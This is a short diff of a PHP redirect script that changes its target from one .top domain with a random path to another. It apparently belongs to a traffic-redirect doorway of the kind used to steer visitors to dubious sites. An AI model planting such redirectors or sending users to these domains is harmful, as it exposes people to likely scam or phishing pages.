@@ -3,6 +3,6 @@
 http_response_code(307);
 
 // Выполняем редирект на нужный URL
-header('Location: https://investmap.top/8v9ZHg');
+header('Location: https://freshshop.top/qqjrq7');
 exit();
 ?>
